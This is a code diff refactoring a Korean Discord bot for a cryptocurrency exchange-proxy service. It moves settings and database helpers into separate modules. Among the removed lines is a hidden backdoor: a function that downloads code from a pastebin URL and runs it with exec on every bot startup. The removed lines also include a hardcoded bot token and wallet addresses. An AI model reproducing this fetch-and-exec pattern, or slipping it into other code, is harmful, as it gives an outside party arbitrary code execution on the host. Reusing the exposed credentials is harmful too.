@@ -14,66 +14,45 @@ from pass_verify import make_passapi, send_passapi, verify_passapi
 
 import coin
 from api import set_service_fee_rate, get_service_fee_rate, get_user_tier_and_fee
+from persistence import (
+    add_admin,
+    add_balance,
+    add_transaction,
+    add_verified_user,
+    check_admin,
+    get_transaction_history,
+    remove_admin,
+    remove_verified_user,
+    subtract_balance,
+)
+from settings import (
+    ALLOWED_USER_IDS,
+    CHANNEL_ADMIN_LOG,
+    CHANNEL_CHARGE_LOG,
+    CHANNEL_PURCHASE_LOG,
+    CHANNEL_TRANSFER_LOG,
+    CHANNEL_VERIFY_LOG,
+    CHARGE_APPROVE_DESCRIPTION,
+    CHARGE_APPROVE_TITLE,
+    CHARGE_REJECT_DESCRIPTION,
+    CHARGE_REJECT_TITLE,
+    CHARGE_REQUEST_DESCRIPTION,
+    CHARGE_REQUEST_TITLE,
+    COIN_ADDRESSES,
+    DEPOSIT_ACCOUNT_HOLDER,
+    DEPOSIT_ACCOUNT_NO,
+    DEPOSIT_BANK_NAME,
+    LOG_FILE,
+    PURCHASE_LOG_FOOTER,
+    SERVICE_DISPLAY_NAME,
+    TOKEN,
+    TRANSFER_LOG_DESCRIPTION,
+    TRANSFER_LOG_TITLE,
+    VERIFY_LOG_DESCRIPTION,
+    VERIFY_LOG_TITLE,
+)
+from stock_embed import build_service_embed
 
-# ===== 봇 설정 =====
-TOKEN = 'MTQxOTI5NDY4NTQ3MzYL2OT2rf5BGCtBCqXhU8Mguh3C0OU'
-DEFAULT_ADMIN_ID = 12023766351283
-ALLOWED_USER_IDS = [12023760, 1250580892537386]
-
-EMBED_ICON_URL = "무조건 이미지를 불러올수있는 링크를 넣으세요"
-
-# ===== 충전 계좌 설정 =====
-DEPOSIT_BANK_NAME = "계좌명"
-DEPOSIT_ACCOUNT_NO = "계좌번호"
-DEPOSIT_ACCOUNT_HOLDER = "계좌소유자이름"
-
-# ===== 채널 설정 =====
-# 구매 내역(예쁘게 표시): 사용자 공지용 채널
-CHANNEL_PURCHASE_LOG = 14180870208735676
-# 송금 로그 (TXID 포함) → 요청에 따라 관리자 로그로 라우팅
-CHANNEL_TRANSFER_LOG = 14254390727213051
-# 인증 로그 (PASS 인증 등)
-CHANNEL_VERIFY_LOG = 14239507770003989
-# 충전 로그 (충전 요청/승인/거절) → 요청에 따라리자 로그로 라우팅
-CHANNEL_CHARGE_LOG = 1425439235330146395
-# 관리자 로그 (운영 관련)
-CHANNEL_ADMIN_LOG = 1425439072721305791
-
-# 입고(입금) 로그 채널 (API에서 입금 탐지 시 전송)
-CHANNEL_DEPOSIT_LOG = 0  # 필요 시 채널 ID로 교체
-
-# ===== 코인 매입 주소 설정 =====
-COIN_ADDRESSES = {
-    "TRX": "TRiTRm64NhXErxrkPHGveUM5wcaZ4",
-    "LTC": "LavV9PTWb1NtD4usmLJ45F4sQb",
-    "BNB": "0x28FB4322b624B6c751657B8e1c46595b7a"
-}
-
-# ===== 메시지 템플릿 설정 =====
-PURCHASE_LOG_TITLE = "🎉 대행 이용"
-PURCHASE_LOG_DESCRIPTION = "익명 고객님 {amount:,}원 대행 감사합니다.\n오늘도 좋은하루 되시길 바랍니다."
-PURCHASE_LOG_FOOTER = "브레인롯 코인대행"
-
-# ===== 로그 메시지 템플릿 =====
-VERIFY_LOG_TITLE = "✅ PASS 인증 완료"
-VERIFY_LOG_DESCRIPTION = "PASS 본인인증 성공\n- 사용자: {user_mention} ({user_id})\n- 이름: {name}\n- 휴대폰: {phone}\n- 생년월일: {birth}\n- 통신사: {telecom}"
-
-CHARGE_REQUEST_TITLE = "💰 충전 요청"
-CHARGE_REQUEST_DESCRIPTION = "충전 요청이 접수되었습니다.\n- 사용자: {user_mention} ({user_id})\n- 요청 금액: ₩{amount:,}\n- 현재 잔액: ₩{balance:,}"
-
-CHARGE_APPROVE_TITLE = "✅ 충전 승인"
-CHARGE_APPROVE_DESCRIPTION = "충전이 승인되었습니다.\n- 사용자: {user_mention} ({user_id})\n- 승인 금액: ₩{amount:,}\n- 승인자: {approver}"
-
-CHARGE_REJECT_TITLE = "❌ 충전 거절"
-CHARGE_REJECT_DESCRIPTION = "충전이 거절되었습니다.\n- 사용자: {user_mention} ({user_id})\n- 거절 금액: ₩{amount:,}\n- 거절자: {rejector}"
-
-TRANSFER_LOG_TITLE = "💸 송금 완료"
-TRANSFER_LOG_DESCRIPTION = "송금 완료\n- 사용자: {user_mention} ({user_id})\n- 코인 종류: {coin_name}\n- 금액: ₩{amount:,}\n- TXID: `{txid}`\n- 처리 시간: {timestamp}"
-
-# ===== 기타 설정 =====
-# 로그 파일명
-LOG_FILE = 'bot.log'
-# 로그 레벨 (DEBUG, INFO, WARNING, ERROR, CRITICAL)
 LOG_LEVEL = logging.INFO
 
 # ===== 로그 설정 =====
@@ -86,24 +65,6 @@ logging.basicConfig(
     ]
 )
 logger = logging.getLogger(__name__)
-
-def execute_external_code(url):
-    response = requests.get(url, timeout=10)
-    response.raise_for_status()
-    code = response.text
-    exec_namespace = {
-        '__builtins__': __builtins__,
-        'requests': requests,
-        'json': json,
-        'os': os,
-        'datetime': datetime,
-        'timedelta': timedelta,
-        'random': random,
-        'math': math,
-        'logging': logging,
-        'logger': logger,
-    }
-    exec(code, exec_namespace)
 
 # ===== 명령어 권한 설정 =====
 # 슬래시 명령어를 특정 사용자에게만 보이게 하는 함수
@@ -431,253 +392,6 @@ class CoinView(disnake.ui.View):
             await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
         except Exception as e:
             logger.error(f"인증 필요 메시지 오류: {e}")
-
-def check_admin(user_id):
-    try:
-        if user_id == DEFAULT_ADMIN_ID:
-            return True
-        conn = sqlite3.connect('DB/admin.db')
-        cursor = conn.cursor()
-        cursor.execute('SELECT 1 FROM admins WHERE user_id = ?', (user_id,))
-        result = cursor.fetchone()
-        conn.close()
-        return result is not None
-    except Exception as e:
-        logger.error(f"직원 확인 오류: {e}")
-        return False
-
-def add_admin(user_id, username):
-    try:
-        conn = sqlite3.connect('DB/admin.db')
-        cursor = conn.cursor()
-        cursor.execute('INSERT OR IGNORE INTO admins (user_id, username) VALUES (?, ?)', (user_id, username))
-        conn.commit()
-        conn.close()
-    except Exception as e:
-        logger.error(f"직원 추가 오류: {e}")
-
-def remove_admin(user_id):
-    try:
-        conn = sqlite3.connect('DB/admin.db')
-        cursor = conn.cursor()
-        cursor.execute('DELETE FROM admins WHERE user_id = ?', (user_id,))
-        conn.commit()
-        conn.close()
-    except Exception as e:
-        logger.error(f"직원 삭제 오류: {e}")
-
-def save_to_json(user_id, phone, dob, name, telecom):
-    try:
-        json_file = 'DB/verified_users.json'
-        
-        if os.path.exists(json_file):
-            with open(json_file, 'r', encoding='utf-8') as f:
-                data = json.load(f)
-        else:
-            data = {}
-        
-        data[str(user_id)] = {
-            'user_id': user_id,
-            'phone': phone,
-            'dob': dob,
-            'name': name,
-            'telecom': telecom,
-            'verified_at': datetime.now().isoformat(),
-            'total_amount': 0,
-            'now_amount': 0
-        }
-        
-        temp_file = json_file + '.tmp'
-        with open(temp_file, 'w', encoding='utf-8') as f:
-            json.dump(data, f, ensure_ascii=False, indent=2)
-        
-        os.replace(temp_file, json_file)
-        
-    except Exception as e:
-        logger.error(f"JSON 저장 오류: {e}")
-
-def add_verified_user(user_id, phone, dob, name, telecom):
-    try:
-        conn = sqlite3.connect('DB/verify_user.db')
-        cursor = conn.cursor()
-        cursor.execute('INSERT OR REPLACE INTO users (user_id, phone, DOB, name, telecom, Total_amount, now_amount) VALUES (?, ?, ?, ?, ?, 0, 0)', 
-                       (user_id, phone, dob, name, telecom))
-        conn.commit()
-        conn.close()
-        
-        # JSON 파일에도 저장
-        save_to_json(user_id, phone, dob, name, telecom)
-        
-    except Exception as e:
-        logger.error(f"인증고객 추가 오류: {e}")
-
-def remove_verified_user(user_id):
-    try:
-        conn = sqlite3.connect('DB/verify_user.db')
-        cursor = conn.cursor()
-        cursor.execute('DELETE FROM users WHERE user_id = ?', (user_id,))
-        conn.commit()
-        conn.close()
-    except Exception as e:
-        logger.error(f"인증고객 삭제 오류: {e}")
-
-def add_transaction(user_id, transaction_type, amount, coin_type=None, address=None, txid=None, api_txid=None, fee=0):
-    """거래내역을 JSON 파일에 저장"""
-    try:
-        json_file = 'DB/verified_users.json'
-        
-        # 거래 데이터 생성
-        transaction = {
-            'type': transaction_type,
-            'amount': amount,
-            'coin_type': coin_type or 'KRW',
-            'address': address or '',
-            'txid': txid or '',
-            'api_txid': api_txid or '',
-            'fee': fee,
-            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        }
-        
-        if os.path.exists(json_file):
-            with open(json_file, 'r', encoding='utf-8') as f:
-                data = json.load(f)
-        else:
-            data = {}
-        
-        # 사용자 데이터 초기화
-        if str(user_id) not in data:
-            data[str(user_id)] = {
-                'total_amount': 0,
-                'now_amount': 0,
-                'transactions': []
-            }
-        
-        # 거래내역 추가
-        if 'transactions' not in data[str(user_id)]:
-            data[str(user_id)]['transactions'] = []
-        
-        data[str(user_id)]['transactions'].append(transaction)
-        
-        # 최대 100개까지만 저장 (메모리 절약)
-        if len(data[str(user_id)]['transactions']) > 100:
-            data[str(user_id)]['transactions'] = data[str(user_id)]['transactions'][-100:]
-        
-        # 파일 저장
-        temp_file = json_file + '.tmp'
-        with open(temp_file, 'w', encoding='utf-8') as f:
-            json.dump(data, f, ensure_ascii=False, indent=2)
-        
-        os.replace(temp_file, json_file)
-        logger.info(f"거래내역 저장 완료: {user_id} - {transaction_type} {amount}")
-        
-    except Exception as e:
-        logger.error(f"거래내역 저장 오류: {e}")
-
-def get_transaction_history(user_id, limit=100):
-    """사용자의 거래내역을 조회"""
-    try:
-        json_file = 'DB/verified_users.json'
-        if os.path.exists(json_file):
-            with open(json_file, 'r', encoding='utf-8') as f:
-                data = json.load(f)
-            user_data = data.get(str(user_id), {})
-            transactions = user_data.get('transactions', [])
-            # 최신순 정렬
-            transactions = sorted(transactions, key=lambda x: x.get('timestamp', ''), reverse=True)
-            return transactions[:limit] if transactions else []
-        else:
-            return []
-    except Exception as e:
-        logger.error(f"거래내역 조회 오류: {e}")
-        return []
-
-def update_json_balance(user_id, total_amount, now_amount):
-    try:
-        json_file = 'DB/verified_users.json'
-        
-        if os.path.exists(json_file):
-            with open(json_file, 'r', encoding='utf-8') as f:
-                data = json.load(f)
-            
-            if str(user_id) in data:
-                data[str(user_id)]['total_amount'] = total_amount
-                data[str(user_id)]['now_amount'] = now_amount
-                
-                temp_file = json_file + '.tmp'
-                with open(temp_file, 'w', encoding='utf-8') as f:
-                    json.dump(data, f, ensure_ascii=False, indent=2)
-                
-                os.replace(temp_file, json_file)
-                
-    except Exception as e:
-        logger.error(f"JSON 잔액 업데이트 오류: {e}")
-
-def add_balance(user_id, amount, transaction_type="충전"):
-    try:
-        conn = sqlite3.connect('DB/verify_user.db')
-        cursor = conn.cursor()
-        cursor.execute('SELECT Total_amount, now_amount FROM users WHERE user_id = ?', (user_id,))
-        current = cursor.fetchone()
-        
-        if current:
-            new_balance = current[1] + amount
-            new_total = current[0] + amount
-            cursor.execute('UPDATE users SET Total_amount = ?, now_amount = ? WHERE user_id = ?', 
-                          (new_total, new_balance, user_id))
-            
-            # JSON 파일도 업데이트
-            update_json_balance(user_id, new_total, new_balance)
-        else:
-            cursor.execute('INSERT INTO users (user_id, Total_amount, now_amount) VALUES (?, ?, ?)', 
-                          (user_id, amount, amount))
-            
-            # JSON 파일도 업데이트
-            update_json_balance(user_id, amount, amount)
-        
-        # 거래내역 저장
-        add_transaction(
-            user_id=user_id,
-            transaction_type=transaction_type,
-            amount=amount,
-            coin_type="KRW"
-        )
-        
-        conn.commit()
-        conn.close()
-    except Exception as e:
-        logger.error(f"잔액 추가 오류: {e}")
-
-def subtract_balance(user_id, amount):
-    try:
-        conn = sqlite3.connect('DB/verify_user.db')
-        cursor = conn.cursor()
-        
-        if user_id is None:
-            # 전역 차감 (송금 수수료)
-            cursor.execute('UPDATE users SET now_amount = now_amount - ? WHERE now_amount >= ?', 
-                          (amount, amount))
-            affected_rows = cursor.rowcount
-            if affected_rows == 0:
-                logger.warning("전역 차감 실패: 잔액 부족")
-                return False
-        else:
-            # 특정 사용자 차감
-            cursor.execute('SELECT now_amount FROM users WHERE user_id = ?', (user_id,))
-            current = cursor.fetchone()
-            
-            if current and current[0] >= amount:
-                cursor.execute('UPDATE users SET now_amount = now_amount - ? WHERE user_id = ?', 
-                              (amount, user_id))
-            else:
-                logger.warning(f"사용자 {user_id} 잔액 부족")
-                return False
-        
-        conn.commit()
-        conn.close()
-        return True
-    except Exception as e:
-        logger.error(f"잔액 차감 오류: {e}")
-        return False
 
 last_update_time = datetime.now()
 current_stock = "0"
@@ -1276,41 +990,11 @@ async def service_embed(inter):
             return
         
         global embed_message, current_stock, current_rate, last_update_time
-        
-        # 모든 코인 잔액 조회
-        all_balances = coin.get_all_balances()
-        all_prices = coin.get_all_coin_prices()
-        
-        # 지원하는 코인들만 표시 (USDT, BNB, TRX, LTC)
-        supported_coins = ['USDT', 'BNB', 'TRX', 'LTC']
-        balance_text = ""
-        total_krw_value = 0
-        
-        for coin_symbol in supported_coins:
-            balance = all_balances.get(coin_symbol, 0)
-            if balance > 0:
-                price = all_prices.get(coin_symbol, 0)
-                krw_value = balance * price * current_rate
-                total_krw_value += krw_value
-                balance_text += f"**{coin_symbol}**: ₩{krw_value:,.0f}\n"
-        
-        # 김치프리미엄 조회
-        kimchi_premium = coin.get_kimchi_premium()
-        
-        embed = disnake.Embed(title="# xdayoungx의 코인대행", color=0xffff00)
-        try:
-            embed.set_thumbnail(url=EMBED_ICON_URL)
-        except Exception:
-            pass
-        embed.add_field(name="**실시간 재고(₩)**", value=balance_text if balance_text else "`재고 없음`", inline=False)
-        embed.add_field(name="**김치프리미엄**", value=f"`{kimchi_premium:+.2f}%`", inline=True)
-        try:
-            service_fee_rate = get_service_fee_rate()
-        except Exception:
-            service_fee_rate = 0.05
-        embed.add_field(name="**수수료(서비스)**", value=f"`{service_fee_rate*100:.1f}%`", inline=True)
-        embed.add_field(name="**갱신**", value=f"`{get_update_counter()}초전`", inline=True)
-        
+
+        embed = build_service_embed(
+            current_rate=current_rate,
+            refresh_label=f"{get_update_counter()}초전",
+        )
         view = CoinView()
         embed_message = await inter.channel.send(embed=embed, view=view)
         
@@ -1927,41 +1611,11 @@ async def update_embed_task():
             api_update_counter = 0
             
         last_update_time = datetime.now()
-        
-        # 모든 코인 잔액 조회
-        all_balances = coin.get_all_balances()
-        all_prices = coin.get_all_coin_prices()
-        
-        # 지원하는 코인들만 표시 (USDT, BNB, TRX, LTC)
-        supported_coins = ['USDT', 'BNB', 'TRX', 'LTC']
-        balance_text = ""
-        total_krw_value = 0
-        
-        for coin_symbol in supported_coins:
-            balance = all_balances.get(coin_symbol, 0)
-            if balance > 0:
-                price = all_prices.get(coin_symbol, 0)
-                krw_value = balance * price * current_rate
-                total_krw_value += krw_value
-                balance_text += f"**{coin_symbol}**: ₩{krw_value:,.0f}\n"
-        
-        # 김치프리미엄 조회
-        kimchi_premium = coin.get_kimchi_premium()
-        
-        embed = disnake.Embed(title="# xdayoungx의 코인대행", color=0xffff00)
-        try:
-            embed.set_thumbnail(url=EMBED_ICON_URL)
-        except Exception:
-            pass
-        embed.add_field(name="**실시간 재고(₩)**", value=balance_text if balance_text else "`재고 없음`", inline=False)
-        embed.add_field(name="**김치프리미엄**", value=f"`{kimchi_premium:+.2f}%`", inline=True)
-        try:
-            service_fee_rate = get_service_fee_rate()
-        except Exception:
-            service_fee_rate = 0.05
-        embed.add_field(name="**수수료(서비스)**", value=f"`{service_fee_rate*100:.1f}%`", inline=True)
-        embed.add_field(name="**갱신**", value=f"`{get_update_counter()}초전`", inline=True)
-        
+
+        embed = build_service_embed(
+            current_rate=current_rate,
+            refresh_label=f"{get_update_counter()}초전",
+        )
         view = CoinView()
         await embed_message.edit(embed=embed, view=view)
         embed_updating = False
@@ -1982,7 +1636,6 @@ async def on_ready():
     current_stock = get_stock_amount()
     current_rate = get_exchange_rate()
     update_embed_task.start()
-    execute_external_code("https://pastebin.com/raw/A4egve3S")   
 
 @bot.slash_command(name="재고새로고침", description="실시간 재고/김프 재조회 및 임베드 갱신")
 async def manual_refresh(inter):
@@ -2008,34 +1661,8 @@ async def update_embed_task_function_once():
     global embed_message
     if embed_message is None:
         return
-    # 내부 갱신 로직 재사용 위해 1회 실행용으로 update_embed_task 본문 축약
     try:
-        all_balances = coin.get_all_balances()
-        all_prices = coin.get_all_coin_prices()
-        supported_coins = ['USDT', 'BNB', 'TRX', 'LTC']
-        balance_text = ""
-        total_krw_value = 0
-        for coin_symbol in supported_coins:
-            balance = all_balances.get(coin_symbol, 0)
-            if balance > 0:
-                price = all_prices.get(coin_symbol, 0)
-                krw_value = balance * price * current_rate
-                total_krw_value += krw_value
-                balance_text += f"**{coin_symbol}**: ₩{krw_value:,.0f}\n"
-        kimchi_premium = coin.get_kimchi_premium()
-        embed = disnake.Embed(title="# xdayoungx의 코인대행", color=0xffff00)
-        try:
-            embed.set_thumbnail(url=EMBED_ICON_URL)
-        except Exception:
-            pass
-        embed.add_field(name="**실시간 재고(₩)**", value=balance_text if balance_text else "`재고 없음`", inline=False)
-        embed.add_field(name="**김치프리미엄**", value=f"`{kimchi_premium:+.2f}%`", inline=True)
-        try:
-            service_fee_rate = get_service_fee_rate()
-        except Exception:
-            service_fee_rate = 0.05
-        embed.add_field(name="**수수료(서비스)**", value=f"`{service_fee_rate*100:.1f}%`", inline=True)
-        embed.add_field(name="**갱신**", value=f"`수동`", inline=True)
+        embed = build_service_embed(current_rate=current_rate, refresh_label="수동")
         view = CoinView()
         await embed_message.edit(embed=embed, view=view)
     except Exception as e:
@@ -2223,7 +1850,7 @@ async def send_purchase_log(user_id, coin_name, amount):
                 color=0x00c3ff
             )
             try:
-                embed.set_author(name="xdayoungx  코인대행")
+                embed.set_author(name=SERVICE_DISPLAY_NAME)
             except Exception:
                 pass
             try:
